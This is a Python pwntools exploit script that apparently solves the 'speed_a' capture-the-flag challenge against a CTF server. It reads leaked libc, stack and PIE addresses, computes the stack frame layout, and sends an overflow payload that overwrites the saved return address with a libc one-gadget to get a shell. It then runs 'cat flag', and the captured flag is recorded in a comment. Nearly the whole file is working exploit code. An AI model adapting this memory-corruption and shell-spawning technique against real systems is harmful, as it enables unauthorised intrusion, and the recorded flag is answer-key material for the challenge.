#!/usr/bin/env python3
from pwn import *
# buf = rbp - 0x30
# old rbp  <--rbp points here
# retaddr


example_play_rsp = 0x7ffeb896ed38
example_leak_rsp = 0x7ffeb896ed20


with remote("speeda-1.play.hfsc.tf", 42001) as tube:
#with gdb.debug(["./speed_a"], api=True) as tube:
    #tube.gdb.execute("b *(&play+(0x1313-0x128F))")
    #tube.gdb.continue_nowait()

    tube.recvuntil(b"libc:")
    libc = int(tube.recvline(), 16)
    libc -= 0x29dc0
    tube.recvuntil(b"stack:")
    stack = int(tube.recvline(), 16)
    play_rsp = stack - example_leak_rsp + example_play_rsp
    play_rip = play_rsp
    play_rbp = play_rip - 0x8
    play_cookie = play_rbp - 0x8
    play_p = play_cookie - 0x8
    play_buf = play_p - 0x20
    tube.recvuntil(b"pie:")
    pie = int(tube.recvline(), 16)

    print(f"{libc=:x}")
    print(f"{stack=:x}")
    print(f"{play_rsp=:x}")
    print(f"{play_rip=:x}")
    print(f"{play_rbp=:x}")
    print(f"{play_cookie=:x}")
    print(f"{play_p=:x}")
    print(f"{play_buf=:x}")
    print(f"{pie=:x}")

    tube.sendlineafter(b"data", flat({
        #0x30: struct.pack("<QQ", pie + 0x402C + 0x48, libc + 0xebd3f),
        #0x38: struct.pack("<Q", libc),
        0x20: bytes(((play_p + 2) & 0xff, ((play_p - 0x10000) >> 16) & 0xff)) + b"A" * (0x10000 - 3) + bytes((play_rip & 0xff,)) + struct.pack("<Q", libc + 0xebd3f),
    }))
    tube.sendline(b"cat flag")
    # midnight{f0e255bb63c7242f13c6ec8ff52aee16}
    tube.recvall()
